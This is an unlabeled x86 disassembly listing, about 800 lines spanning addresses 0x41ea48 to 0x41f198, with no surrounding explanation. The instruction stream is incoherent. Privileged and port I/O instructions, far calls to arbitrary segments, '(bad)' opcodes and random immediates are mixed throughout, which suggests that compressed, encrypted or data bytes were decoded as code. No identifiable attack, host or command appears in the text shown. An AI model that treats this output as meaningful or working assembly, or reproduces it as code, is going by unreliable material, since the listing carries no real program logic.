  41ea48:	pop    esp
  41ea49:	jo     0x41ea29
  41ea4b:	xor    ch,ch
  41ea4d:	and    BYTE PTR [eax+0x58],0x20
  41ea51:	pusha  
  41ea52:	inc    esp
  41ea53:	mov    ds:0xe6ce03a8,eax
  41ea58:	ret    0xc214
  41ea5b:	rcr    DWORD PTR [ebx-0xa],cl
  41ea5e:	xchg   DWORD PTR [esi+0x73934520],edx
  41ea64:	or     ah,0xb6
  41ea67:	lock ins BYTE PTR es:[edi],dx
  41ea69:	or     bh,BYTE PTR [ecx-0x3188ff19]
  41ea6f:	bound  esp,QWORD PTR [esi-0x5e37af66]
  41ea75:	sub    DWORD PTR [esi+0xd],edx
  41ea78:	hlt    
  41ea79:	mov    ah,0x61
  41ea7b:	cmp    al,0x80
  41ea7d:	xor    eax,0x263197e5
  41ea82:	dec    edx
  41ea83:	retf   
  41ea84:	push   ebp
  41ea85:	add    eax,0x7b8b75a2
  41ea8a:	out    0x55,al
  41ea8c:	das    
  41ea8d:	sar    esi,1
  41ea8f:	sbb    eax,edi
  41ea91:	adc    BYTE PTR [ecx-0x76394a02],dl
  41ea97:	neg    BYTE PTR [edi]
  41ea99:	cmc    
  41ea9a:	push   ebp
  41ea9b:	xchg   ebp,eax
  41ea9c:	cmp    ebx,0x2d6207c1
  41eaa2:	mov    ah,0x40
  41eaa4:	pop    ss
  41eaa5:	mov    al,bh
  41eaa7:	je     0x41ea78
  41eaa9:	pop    eax
  41eaaa:	sbb    ch,ch
  41eaac:	fs ret 0x7eb1
  41eab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab1:	adc    al,0x2e
  41eab3:	mov    es,WORD PTR [ebp+0x7c0aa3f8]
  41eab9:	mov    eax,0x87741601
  41eabe:	xchg   esi,eax
  41eabf:	inc    eax
  41eac0:	fdivr  st,st(6)
  41eac2:	ror    BYTE PTR [ebx-0x22af8c4],1
  41eac8:	xor    al,BYTE PTR [ebx]
  41eaca:	and    al,0x8c
  41eacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eacd:	sbb    BYTE PTR ds:0xe41115fd,dh
  41ead3:	mov    ds:0x5a4a1873,al
  41ead8:	xor    al,cl
  41eada:	sub    ah,BYTE PTR [ebx]
  41eadc:	mov    ds:0x7847a764,eax
  41eae1:	ins    DWORD PTR es:[edi],dx
  41eae2:	dec    ebx
  41eae3:	in     eax,dx
  41eae4:	xchg   ebp,eax
  41eae5:	adc    eax,0x58403de4
  41eaea:	out    dx,eax
  41eaeb:	adc    esp,DWORD PTR [eax]
  41eaed:	pop    ebp
  41eaee:	sub    BYTE PTR [eax-0x66],cl
  41eaf1:	xchg   ecx,eax
  41eaf2:	icebp  
  41eaf3:	and    dh,BYTE PTR [edi+ebx*2-0x9]
  41eaf7:	setnp  BYTE PTR [ecx+0x2b]
  41eafb:	mov    esi,0x230b67f4
  41eb00:	imul   ecx,DWORD PTR [eax],0x9a3724fd
  41eb06:	mov    edx,0x8f3952f
  41eb0b:	popf   
  41eb0c:	fidivr DWORD PTR [edi+0x29]
  41eb0f:	lods   al,BYTE PTR ds:[esi]
  41eb10:	cmp    BYTE PTR ds:0xca4c9fef,0xe
  41eb17:	test   DWORD PTR [eax+0x73],esp
  41eb1a:	lods   al,BYTE PTR ds:[esi]
  41eb1b:	rcr    DWORD PTR [ecx-0x1],cl
  41eb1e:	push   edi
  41eb1f:	ins    DWORD PTR es:[edi],dx
  41eb20:	cmp    BYTE PTR [esi],dh
  41eb22:	sahf   
  41eb23:	adc    dl,ch
  41eb25:	xchg   edx,eax
  41eb26:	(bad)  
  41eb27:	fwait
  41eb28:	dec    ecx
  41eb29:	push   0x65
  41eb2b:	adc    BYTE PTR [esi-0x515c2585],al
  41eb31:	adc    BYTE PTR [edx-0x5f4069f5],bh
  41eb37:	cmp    bl,BYTE PTR [eax-0x7a]
  41eb3a:	jl     0x41eb6a
  41eb3c:	jp     0x41eb51
  41eb3e:	mov    ch,0x31
  41eb40:	mov    ah,0xbf
  41eb42:	sbb    esi,esp
  41eb44:	pop    DWORD PTR [edx+0x5144e9c4]
  41eb4a:	or     ah,bh
  41eb4c:	jp     0x41eb94
  41eb4e:	ds push edx
  41eb50:	lods   eax,DWORD PTR ds:[esi]
  41eb51:	frndint 
  41eb53:	call   0x137a:0x99526d6d
  41eb5a:	mov    ebx,0xab10765e
  41eb5f:	adc    DWORD PTR [ecx+0x735b0e07],eax
  41eb65:	xor    esi,DWORD PTR [ebp-0xdd31c25]
  41eb6b:	lea    edx,[edi-0x45]
  41eb6e:	(bad)  
  41eb6f:	xchg   edx,eax
  41eb70:	retf   0xb62c
  41eb73:	mov    BYTE PTR [ebx-0x48],dl
  41eb76:	sti    
  41eb77:	lahf   
  41eb78:	popa   
  41eb79:	and    BYTE PTR [eax+0x5d3dd474],0xb9
  41eb80:	loope  0x41eb9c
  41eb82:	mov    dh,0x79
  41eb84:	dec    ecx
  41eb85:	mov    ebx,DWORD PTR [ebx-0x3f8338fe]
  41eb8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb8c:	stos   DWORD PTR es:[edi],eax
  41eb8d:	push   edx
  41eb8e:	mov    bl,0xb0
  41eb90:	add    ebx,esp
  41eb92:	push   ecx
  41eb93:	xchg   ebx,eax
  41eb94:	sbb    esp,DWORD PTR [ebx-0x5d]
  41eb97:	mov    DWORD PTR [edi+0x39],edi
  41eb9a:	adc    DWORD PTR [edi+0x37abb725],ebp
  41eba0:	mov    WORD PTR [edi],fs
  41eba2:	pop    ss
  41eba3:	or     al,0xe7
  41eba5:	add    eax,0x51e5630e
  41ebaa:	mov    ds:0x89c8a704,eax
  41ebaf:	mov    dl,0x88
  41ebb1:	(bad)  
  41ebb2:	call   0xb25fdd07
  41ebb7:	std    
  41ebb8:	sub    eax,0x6b68d652
  41ebbd:	xchg   ecx,eax
  41ebbe:	mov    ah,0xc7
  41ebc0:	and    al,0xaf
  41ebc2:	das    
  41ebc3:	adc    edi,DWORD PTR [eax+eiz*2-0x6f]
  41ebc7:	call   0x77e0cd6f
  41ebcc:	fiadd  DWORD PTR [ebx-0x37a5eb26]
  41ebd2:	and    BYTE PTR [ecx+0x3767aff4],al
  41ebd8:	into   
  41ebd9:	fisubr DWORD PTR [eax-0x427255f1]
  41ebdf:	xchg   edx,eax
  41ebe0:	les    edi,FWORD PTR [ecx-0x10]
  41ebe3:	push   es
  41ebe4:	popa   
  41ebe5:	mul    DWORD PTR [eax-0x72cbcf7e]
  41ebeb:	(bad)  
  41ebed:	xor    DWORD PTR [eax-0x3fc82bb1],0xffffff85
  41ebf4:	or     BYTE PTR [edx-0x6601861c],dl
  41ebfa:	xchg   ecx,eax
  41ebfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebfc:	lods   eax,DWORD PTR ds:[esi]
  41ebfd:	push   es
  41ebfe:	jmp    0x69d9:0x1a762d43
  41ec05:	call   0x6841:0xe3925de1
  41ec0c:	ins    BYTE PTR es:[edi],dx
  41ec0d:	std    
  41ec0e:	icebp  
  41ec0f:	pop    esp
  41ec10:	or     DWORD PTR [eax+0x57a51598],eax
  41ec16:	push   edi
  41ec17:	pushf  
  41ec18:	retf   0xa4f8
  41ec1b:	xchg   ebp,eax
  41ec1c:	sub    cl,BYTE PTR [ecx-0x46]
  41ec1f:	inc    edx
  41ec20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec21:	push   esi
  41ec22:	inc    esp
  41ec23:	jno    0x41ebc2
  41ec25:	mov    bh,0x51
  41ec27:	ds test al,0xbc
  41ec2a:	jle    0x41ec20
  41ec2c:	setno  BYTE PTR [edi]
  41ec2f:	daa    
  41ec30:	sbb    al,0x66
  41ec32:	mov    ebx,0x3791a5b5
  41ec37:	cmove  ebp,DWORD PTR [ebx+0x3e32db0c]
  41ec3e:	xchg   edi,eax
  41ec3f:	adc    edi,DWORD PTR [ebx+0x6]
  41ec42:	jecxz  0x41ebf8
  41ec44:	int3   
  41ec45:	jne    0x41ec6b
  41ec47:	and    al,0xfc
  41ec49:	cli    
  41ec4a:	xor    bl,BYTE PTR [edi]
  41ec4c:	cmp    eax,0xdbdb9e53
  41ec51:	xlat   BYTE PTR ds:[ebx]
  41ec52:	pop    esi
  41ec53:	inc    ecx
  41ec54:	jne    0x41ec3d
  41ec56:	aas    
  41ec57:	push   esi
  41ec58:	lods   al,BYTE PTR ds:[esi]
  41ec59:	jbe    0x41ebf2
  41ec5b:	push   0x6860e06e
  41ec60:	adc    bl,BYTE PTR [esi-0x10]
  41ec63:	sub    edx,DWORD PTR [ecx]
  41ec65:	not    DWORD PTR [ebp-0x2c]
  41ec68:	rcl    esi,cl
  41ec6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec6b:	sub    dl,bh
  41ec6d:	enter  0xffd9,0xf
  41ec71:	xchg   edx,eax
  41ec72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec73:	xchg   ecx,eax
  41ec74:	ret    
  41ec75:	or     al,0xb9
  41ec77:	call   0xb71afeaa
  41ec7c:	lods   eax,DWORD PTR ds:[esi]
  41ec7d:	les    eax,FWORD PTR [esi+0x7789b2]
  41ec83:	mov    edx,DWORD PTR cs:[eax-0x368fbe30]
  41ec8a:	pop    edx
  41ec8b:	(bad)  [ebp-0x40913e8c]
  41ec91:	ins    BYTE PTR es:[edi],dx
  41ec92:	es inc eax
  41ec94:	(bad)  [esi-0x28]
  41ec97:	sar    DWORD PTR ds:0x15943c18,0xb9
  41ec9e:	lods   eax,DWORD PTR ds:[esi]
  41ec9f:	push   cs
  41eca0:	in     eax,dx
  41eca1:	xchg   esi,ebx
  41eca3:	inc    esi
  41eca4:	jecxz  0x41ecd8
  41eca6:	adc    edx,DWORD PTR [esi]
  41eca8:	and    DWORD PTR [eax-0x49],ebx
  41ecab:	or     DWORD PTR [ecx],esp
  41ecad:	int3   
  41ecae:	xchg   esi,eax
  41ecaf:	out    0xc0,eax
  41ecb1:	pushf  
  41ecb2:	rol    DWORD PTR [bp+si-0x7cfc],0xde
  41ecb8:	retf   
  41ecb9:	sti    
  41ecba:	mov    ecx,0x1f4cc9ec
  41ecbf:	or     DWORD PTR [ebp+0x23245811],ebx
  41ecc5:	loope  0x41ec72
  41ecc7:	rcr    DWORD PTR [ebp-0x14],cl
  41ecca:	imul   edi,DWORD PTR [eax],0x6a
  41eccd:	jno    0x41ed05
  41eccf:	js     0x41ecf6
  41ecd1:	and    DWORD PTR [edi+0x508126f2],ebx
  41ecd7:	sbb    eax,0x69ce1bfd
  41ecdc:	add    al,BYTE PTR [edi-0x340a6bef]
  41ece2:	inc    edi
  41ece3:	fucomi st,st(5)
  41ece5:	xchg   esp,eax
  41ece6:	add    al,0xa3
  41ece8:	pop    ecx
  41ece9:	sbb    bh,ch
  41eceb:	adc    cl,bl
  41eced:	push   es
  41ecee:	das    
  41ecef:	jne    0x41ed1c
  41ecf1:	mov    ch,BYTE PTR ds:0x178f027
  41ecf7:	sbb    DWORD PTR [ebx-0x56],esi
  41ecfa:	and    ebx,ebp
  41ecfc:	fnstsw WORD PTR [edi+0x2f]
  41ecff:	loopne 0x41ed16
  41ed01:	xor    al,0xe5
  41ed03:	cmp    DWORD PTR [edi+0x1a6ab87],ebp
  41ed09:	(bad)  
  41ed0a:	js     0x41ed5f
  41ed0c:	sti    
  41ed0d:	addr16 nop
  41ed0f:	stc    
  41ed10:	adc    al,0xf9
  41ed12:	pop    ds
  41ed13:	fld    DWORD PTR [ecx+0x6f5d7861]
  41ed19:	add    ah,bh
  41ed1b:	repz cmp eax,0xe0810545
  41ed21:	popa   
  41ed22:	pusha  
  41ed23:	sar    esi,cl
  41ed25:	jl     0x41ed68
  41ed27:	ficom  WORD PTR [esi+0xd]
  41ed2a:	sub    ebx,ebp
  41ed2c:	jns    0x41ed3d
  41ed2e:	test   eax,0x33072b48
  41ed33:	test   al,0x17
  41ed35:	jecxz  0x41ed4c
  41ed37:	and    BYTE PTR [eax+0x5b],bh
  41ed3a:	inc    esi
  41ed3b:	push   edx
  41ed3c:	mov    al,ds:0x54f84350
  41ed41:	jp     0x41ecdb
  41ed43:	cwde   
  41ed44:	sub    BYTE PTR [ecx],0xd0
  41ed47:	inc    edx
  41ed48:	jno    0x41ed19
  41ed4a:	sbb    eax,0xff6a3c2
  41ed4f:	imul   esi,DWORD PTR [eax+0x5c88e47b],0x48d794fe
  41ed59:	sub    DWORD PTR [ecx+0x7a],ebx
  41ed5c:	sub    al,0x6b
  41ed5e:	jo     0x41edc6
  41ed60:	rcl    DWORD PTR [edx+0x39],1
  41ed63:	mov    ds:0x43645b86,eax
  41ed68:	pop    ecx
  41ed69:	and    al,0xc8
  41ed6b:	das    
  41ed6c:	jl     0x41edeb
  41ed6e:	jmp    0x27e48a66
  41ed73:	xor    edx,DWORD PTR [edx]
  41ed75:	scas   eax,DWORD PTR es:[edi]
  41ed76:	popa   
  41ed77:	inc    esp
  41ed78:	cwde   
  41ed79:	adc    DWORD PTR [eax+0x1c],edi
  41ed7c:	xor    dh,BYTE PTR [edx+0x65]
  41ed7f:	ins    DWORD PTR es:[edi],dx
  41ed80:	popf   
  41ed81:	sar    ebp,1
  41ed83:	shl    ah,0x17
  41ed86:	in     eax,0xce
  41ed88:	mov    edi,0xec3f56cb
  41ed8d:	push   esp
  41ed8e:	les    eax,FWORD PTR [edi+0x4af19bff]
  41ed94:	adc    BYTE PTR [ebx+0xf],cl
  41ed97:	push   ecx
  41ed98:	push   ebp
  41ed99:	fnsave [edx]
  41ed9b:	fbstp  TBYTE PTR [ebx]
  41ed9d:	and    BYTE PTR [ebx-0xa74f10b],bl
  41eda3:	fistp  QWORD PTR [ecx]
  41eda5:	jg     0x41eda7
  41eda7:	mov    ecx,0x9094b499
  41edac:	call   0x3136:0x5121831c
  41edb3:	sub    esi,eax
  41edb5:	dec    ebp
  41edb6:	add    al,0xf4
  41edb8:	or     eax,0x7a6ad4b
  41edbd:	aam    0x4d
  41edbf:	nop
  41edc0:	mov    edx,0x46459a7
  41edc5:	(bad)  
  41edc6:	sbb    BYTE PTR [ecx-0xe],ah
  41edc9:	fdivr  DWORD PTR [esi+0x60]
  41edcc:	out    0x30,eax
  41edce:	add    eax,DWORD PTR [esi]
  41edd0:	pop    ss
  41edd1:	pop    ecx
  41edd2:	jl     0x41edaa
  41edd4:	sahf   
  41edd5:	test   al,0xf0
  41edd7:	mov    bh,0x20
  41edd9:	add    ch,0xb0
  41eddc:	dec    ebp
  41eddd:	or     eax,0x9bedb313
  41ede2:	mov    esp,DWORD PTR [ecx-0x7]
  41ede5:	push   eax
  41ede6:	inc    esp
  41ede7:	test   al,0x7
  41ede9:	ror    DWORD PTR [esi+0x20],cl
  41edec:	ss nop
  41edee:	xchg   ebx,eax
  41edef:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edf1:	push   es
  41edf2:	aam    0x8c
  41edf4:	sbb    ecx,0xffffffb3
  41edf7:	ins    BYTE PTR es:[edi],dx
  41edf8:	popf   
  41edf9:	pop    ecx
  41edfa:	dec    ebx
  41edfb:	clc    
  41edfc:	lods   eax,DWORD PTR ds:[esi]
  41edfd:	loopne 0x41ee38
  41edff:	mov    esi,edx
  41ee01:	test   BYTE PTR [ecx-0x4],ah
  41ee04:	loope  0x41ee36
  41ee06:	dec    edi
  41ee07:	adc    eax,0x54dd413a
  41ee0c:	fwait
  41ee0d:	xchg   BYTE PTR [ebx+0x3a47d322],cl
  41ee13:	ja     0x41edb0
  41ee15:	cmp    bh,BYTE PTR [ebx-0x710a1919]
  41ee1b:	scas   al,BYTE PTR es:[edi]
  41ee1c:	pop    ebx
  41ee1d:	cmp    BYTE PTR [esi+0x13],ah
  41ee20:	inc    ebx
  41ee21:	mov    al,0xad
  41ee23:	in     al,dx
  41ee24:	inc    eax
  41ee25:	mov    ebx,0x8614e5ac
  41ee2a:	push   ebp
  41ee2b:	push   edi
  41ee2c:	push   eax
  41ee2d:	push   ebp
  41ee2e:	call   0xb7da3933
  41ee33:	cmc    
  41ee34:	xchg   esp,eax
  41ee35:	fcmovnb st,st(1)
  41ee37:	dec    ecx
  41ee38:	daa    
  41ee39:	jae    0x41ee6e
  41ee3b:	push   es
  41ee3c:	aaa    
  41ee3d:	test   DWORD PTR [esi+0x4a53e2ee],0x56144834
  41ee47:	aad    0xeb
  41ee49:	inc    esp
  41ee4a:	and    eax,0x4a786e48
  41ee4f:	lock mov al,ds:0xc82cfaa7
  41ee55:	inc    ecx
  41ee56:	adc    edi,DWORD PTR [eax+ecx*1+0x70]
  41ee5a:	shl    DWORD PTR [ebp-0x5c],0xa
  41ee5e:	pmulhw mm6,QWORD PTR [edx]
  41ee61:	aad    0x74
  41ee63:	or     dl,BYTE PTR [ecx]
  41ee65:	push   edi
  41ee66:	shl    BYTE PTR [ebx-0x58768156],cl
  41ee6c:	mov    ch,0x5d
  41ee6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee6f:	pusha  
  41ee70:	stc    
  41ee71:	mov    dh,0x98
  41ee73:	mov    edx,0x4980a21
  41ee78:	jnp    0x41ee3f
  41ee7a:	bound  esp,QWORD PTR [edi+0x51]
  41ee7d:	xlat   BYTE PTR ds:[ebx]
  41ee7e:	int    0x6e
  41ee80:	xchg   edx,eax
  41ee81:	xor    eax,0x82b12bd2
  41ee86:	in     al,0xf0
  41ee88:	push   0x7fcc6ae9
  41ee8d:	ins    BYTE PTR es:[edi],dx
  41ee8e:	mov    bh,0x18
  41ee90:	icebp  
  41ee91:	adc    eax,0x2558d95e
  41ee96:	add    ecx,DWORD PTR [esp+ebx*1+0x53]
  41ee9a:	jbe    0x41ee34
  41ee9c:	fiadd  WORD PTR [ebx+eax*4+0x461bdc14]
  41eea3:	(bad)  
  41eea4:	int3   
  41eea5:	hlt    
  41eea6:	inc    ebp
  41eea7:	mov    bl,0x8e
  41eea9:	cdq    
  41eeaa:	fxch   st(4)
  41eeac:	push   ebp
  41eead:	jb     0x41eecf
  41eeaf:	popa   
  41eeb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeb1:	jmp    0xcedcfd21
  41eeb6:	xor    bl,BYTE PTR [ebp+ebx*2+0x467a1ef]
  41eebd:	arpl   WORD PTR ds:0x4fcd586f,si
  41eec3:	adc    edx,DWORD PTR [eax*1+0x4b18548b]
  41eeca:	pop    ds
  41eecb:	aas    
  41eecc:	jp     0x41ee78
  41eece:	adc    cl,BYTE PTR [edx+0x52]
  41eed1:	popa   
  41eed2:	xor    esp,DWORD PTR [eax+0x1b1b4b65]
  41eed8:	push   esp
  41eed9:	mov    dh,0xac
  41eedb:	inc    ebp
  41eedc:	or     eax,0xce821393
  41eee1:	cmp    DWORD PTR [ebx-0xb1ad445],esp
  41eee7:	push   esp
  41eee8:	sbb    eax,0x274a862e
  41eeed:	xchg   ebx,eax
  41eeee:	std    
  41eeef:	sbb    eax,0xe8a2eeb4
  41eef4:	scas   eax,DWORD PTR es:[edi]
  41eef5:	fstp   st(0)
  41eef7:	xchg   esi,eax
  41eef8:	(bad)  
  41eef9:	mov    cl,0x13
  41eefb:	mov    ebp,0x6e11609e
  41ef00:	fidiv  WORD PTR [edx]
  41ef02:	(bad)  
  41ef03:	mov    cl,0x1e
  41ef05:	and    dh,BYTE PTR ds:0x95d94360
  41ef0b:	jno    0x41ef7d
  41ef0d:	and    BYTE PTR [edx-0x63],ch
  41ef10:	and    edi,DWORD PTR [edi+ebp*1+0x53]
  41ef14:	mov    al,0x10
  41ef16:	das    
  41ef17:	enter  0x87ce,0x55
  41ef1b:	(bad)  
  41ef1c:	std    
  41ef1d:	rol    DWORD PTR [esi],0xe2
  41ef20:	inc    DWORD PTR [ecx-0x2e]
  41ef23:	xor    bl,dl
  41ef25:	repz test esp,edi
  41ef28:	pop    esi
  41ef29:	jl     0x41ef0b
  41ef2b:	repz sbb bh,BYTE PTR [ebp+0x2d3ae2d0]
  41ef32:	fisttp DWORD PTR [eax-0x1bb2800c]
  41ef38:	mov    ebp,0x9e95da62
  41ef3d:	adc    ecx,esp
  41ef3f:	test   edx,edx
  41ef41:	cmp    ebx,DWORD PTR [ecx]
  41ef43:	cli    
  41ef44:	xchg   ebp,eax
  41ef45:	or     al,0xda
  41ef47:	mov    ch,0x8f
  41ef49:	mov    ebx,0x2fce8867
  41ef4e:	fadd   QWORD PTR [esi+0xd]
  41ef51:	inc    edx
  41ef52:	xor    eax,0x5edbab1a
  41ef57:	sub    DWORD PTR [ebp+0xa],esi
  41ef5a:	mov    edx,0xc0c34824
  41ef5f:	stos   DWORD PTR es:[edi],eax
  41ef60:	adc    ah,ch
  41ef62:	jae    0x41efbe
  41ef64:	jbe    0x41efdd
  41ef66:	jmp    DWORD PTR [ecx-0x19e41558]
  41ef6c:	mov    bh,0xb0
  41ef6e:	mov    edx,0xd451130f
  41ef73:	neg    DWORD PTR [esi-0x29]
  41ef76:	jp     0x41ef30
  41ef78:	and    ch,BYTE PTR [edi]
  41ef7a:	leave  
  41ef7b:	cmp    ecx,DWORD PTR [edx-0x66eb878a]
  41ef81:	fwait
  41ef82:	nop
  41ef83:	mov    ch,0x43
  41ef85:	jb     0x41ef23
  41ef87:	lahf   
  41ef88:	aas    
  41ef89:	ret    
  41ef8a:	out    0x11,eax
  41ef8c:	lahf   
  41ef8d:	mov    dh,BYTE PTR [ebx-0x32]
  41ef90:	or     eax,0xd63b657d
  41ef95:	pop    ecx
  41ef96:	push   ds
  41ef97:	push   ebx
  41ef98:	sub    ah,dl
  41ef9a:	push   ss
  41ef9b:	adc    edx,ecx
  41ef9d:	dec    ebx
  41ef9e:	pop    ebx
  41ef9f:	repnz fiadd WORD PTR [eax+0x123c4379]
  41efa6:	xchg   edx,eax
  41efa7:	jns    0x41efe5
  41efa9:	fxch   st(4)
  41efab:	cmp    ebp,edi
  41efad:	loope  0x41f009
  41efaf:	mov    ?,WORD PTR [ebp+0x58]
  41efb2:	add    BYTE PTR [esi],0xe6
  41efb5:	pop    ecx
  41efb6:	fprem1 
  41efb8:	stos   DWORD PTR es:[edi],eax
  41efb9:	cwde   
  41efba:	or     eax,ecx
  41efbc:	inc    ecx
  41efbd:	shr    dl,0xd2
  41efc0:	in     al,0x4f
  41efc2:	push   ebx
  41efc3:	mov    ch,BYTE PTR [edx-0x2a77e6aa]
  41efc9:	data16 mov ds:0xaf18805f,al
  41efcf:	pop    ebp
  41efd0:	mov    cs,ebx
  41efd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efd3:	sub    DWORD PTR [ebx],0x5f
  41efd6:	adc    DWORD PTR [ecx-0x1b],ebp
  41efd9:	ins    DWORD PTR es:[edi],dx
  41efda:	div    BYTE PTR [edx]
  41efdc:	pop    ecx
  41efdd:	mov    DWORD PTR [ebp+ebp*4+0x3e],ecx
  41efe1:	jbe    0x41efe0
  41efe3:	into   
  41efe4:	stc    
  41efe5:	loopne 0x41efd8
  41efe7:	test   DWORD PTR [ebp-0x24],edi
  41efea:	dec    edx
  41efeb:	mov    DWORD PTR [esi+0x4cc02614],edi
  41eff1:	pop    ecx
  41eff2:	push   ebx
  41eff3:	mov    BYTE PTR [esi+0x46],al
  41eff6:	in     eax,0x37
  41eff8:	arpl   WORD PTR [ebx-0x63],bp
  41effb:	mov    ebp,edi
  41effd:	sar    cl,0x94
  41f000:	enter  0x46b9,0xe2
  41f004:	stos   DWORD PTR es:[edi],eax
  41f005:	fmul   QWORD PTR [edi]
  41f007:	clc    
  41f008:	mov    dh,0x57
  41f00a:	and    DWORD PTR [esi+0x4b902faa],esi
  41f010:	cmc    
  41f011:	fwait
  41f012:	ja     0x41f034
  41f014:	fistp  WORD PTR [eax+0x31]
  41f017:	and    BYTE PTR [ebp+0x306d8149],bh
  41f01d:	scas   al,BYTE PTR es:[edi]
  41f01e:	xor    bl,bh
  41f020:	dec    ebp
  41f021:	sbb    BYTE PTR [esi],ch
  41f023:	inc    edx
  41f024:	mov    dl,0xd3
  41f026:	mov    edx,0xe4ef6659
  41f02b:	mov    ebx,0x13ec3edd
  41f030:	xchg   DWORD PTR [ebx],ecx
  41f032:	push   esp
  41f033:	or     eax,0xf124187e
  41f038:	or     BYTE PTR [esi+0x3a4ce588],dh
  41f03e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f03f:	mov    ss,WORD PTR gs:[edi+edx*1+0x5d]
  41f044:	cwde   
  41f045:	cdq    
  41f046:	add    eax,0x3c7874c5
  41f04b:	clc    
  41f04c:	retf   0x7fe5
  41f04f:	test   DWORD PTR [ebx],esi
  41f051:	mov    cl,0x75
  41f053:	and    al,0x8e
  41f055:	in     al,dx
  41f056:	fisttp QWORD PTR [edx+0x35]
  41f059:	(bad)  
  41f05a:	push   esp
  41f05b:	mov    ebp,eax
  41f05d:	pop    ecx
  41f05e:	xchg   edx,eax
  41f05f:	mov    ch,0xf4
  41f061:	in     al,0x6e
  41f063:	popf   
  41f064:	mov    eax,0x4d7488cf
  41f069:	lods   eax,DWORD PTR ds:[esi]
  41f06a:	mov    ebx,0x26da8178
  41f06f:	mov    al,ds:0xe76179ca
  41f074:	xchg   ebp,eax
  41f075:	xchg   ecx,eax
  41f076:	add    eax,0x265c30cb
  41f07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07c:	fld    DWORD PTR [ecx+esi*2-0x79]
  41f080:	xchg   edi,eax
  41f081:	cmp    dl,ah
  41f083:	xor    al,0x94
  41f085:	or     DWORD PTR [edx],esi
  41f087:	and    DWORD PTR [eax-0x60],eax
  41f08a:	test   DWORD PTR [edi+ebp*4-0x59],esp
  41f08e:	dec    ecx
  41f08f:	in     al,0x47
  41f091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f092:	fnstsw WORD PTR [eax]
  41f094:	sub    eax,0x90c5646c
  41f099:	add    al,0x2c
  41f09b:	jl     0x41f08f
  41f09d:	jg     0x41f110
  41f09f:	int    0xdc
  41f0a1:	pop    ebx
  41f0a2:	repz test bl,cl
  41f0a5:	ror    DWORD PTR [eax],1
  41f0a7:	scas   eax,DWORD PTR es:[edi]
  41f0a8:	stos   DWORD PTR es:[edi],eax
  41f0a9:	dec    esi
  41f0aa:	push   es
  41f0ab:	loopne 0x41f0b5
  41f0ad:	mov    dl,0x5a
  41f0af:	pop    esi
  41f0b0:	pusha  
  41f0b1:	mov    al,ds:0x46c781f1
  41f0b6:	les    edx,FWORD PTR [eax-0x1992323c]
  41f0bc:	push   es
  41f0bd:	pop    eax
  41f0be:	fdivr  DWORD PTR [ecx-0x623b7f26]
  41f0c4:	pop    esp
  41f0c5:	ins    DWORD PTR es:[edi],dx
  41f0c6:	xor    al,0xc7
  41f0c8:	mov    edi,0x8ae95289
  41f0cd:	jge    0x41f13d
  41f0cf:	jmp    0x4868:0xdff4bd09
  41f0d6:	ds or  bl,cl
  41f0d9:	in     eax,dx
  41f0da:	repz xor ecx,DWORD PTR [edi-0x1c]
  41f0de:	lods   eax,DWORD PTR ds:[esi]
  41f0df:	mov    dh,0x24
  41f0e1:	pop    ebp
  41f0e2:	fidiv  WORD PTR [eax]
  41f0e4:	mov    edi,0x1e490e99
  41f0e9:	xor    esi,DWORD PTR [esi+0x41186b4e]
  41f0ef:	loopne 0x41f07b
  41f0f1:	mov    ds:0xbe0c8dc2,eax
  41f0f6:	popa   
  41f0f7:	scas   eax,DWORD PTR es:[edi]
  41f0f8:	mov    esi,0xd42e746e
  41f0fd:	mov    cs,WORD PTR [ebp-0x24]
  41f100:	das    
  41f101:	push   0x8
  41f103:	lods   eax,DWORD PTR ds:[esi]
  41f104:	scas   eax,DWORD PTR es:[edi]
  41f105:	sbb    al,0x35
  41f107:	cld    
  41f108:	or     bh,BYTE PTR [ecx+0x54947b88]
  41f10e:	push   edx
  41f10f:	dec    edi
  41f110:	outs   dx,BYTE PTR ds:[esi]
  41f111:	dec    BYTE PTR [edi-0x1d]
  41f114:	or     al,0xe0
  41f116:	sbb    DWORD PTR [edi+0x2c],0xca155a0
  41f11d:	jp     0x41f184
  41f11f:	mov    dh,0xcd
  41f121:	cdq    
  41f122:	dec    esp
  41f123:	and    ebp,0xfffffffb
  41f126:	test   eax,0x397a86d3
  41f12b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f12c:	retf   
  41f12d:	call   0x1d0:0x8990b650
  41f134:	fdivr  st(4),st
  41f136:	aas    
  41f137:	push   edi
  41f138:	enter  0x2838,0x5e
  41f13c:	popa   
  41f13d:	fdivrp st(3),st
  41f13f:	or     eax,0xcdc8cf4
  41f144:	mov    esi,0x7ce0dd3d
  41f149:	not    BYTE PTR [edi-0x11954272]
  41f14f:	mov    al,0x3c
  41f151:	and    eax,0x622ac320
  41f156:	(bad)  
  41f157:	cdq    
  41f158:	mov    ds:0xd40b1fb0,eax
  41f15d:	mov    al,0x8d
  41f15f:	ror    DWORD PTR ds:[esi],cl
  41f162:	ins    BYTE PTR es:[edi],dx
  41f163:	ds xor al,0xd6
  41f166:	je     0x41f18e
  41f168:	inc    ecx
  41f169:	and    eax,0xff79992
  41f16e:	push   0xff21e820
  41f173:	xor    esi,0xbf44c5a9
  41f179:	pop    ebx
  41f17a:	adc    bh,BYTE PTR [ebx+0x4b715379]
  41f180:	les    edx,FWORD PTR ds:0x268c43eb
  41f186:	imul   ebp,DWORD PTR [ecx+0x4e9b4ddc],0x70
  41f18d:	sbb    eax,0xb84e9265
  41f192:	jp     0x41f1b8
  41f194:	int3   
  41f195:	xor    ch,BYTE PTR [edi]
  41f197:	pusha  
  41f198:	xchg   esi,eax
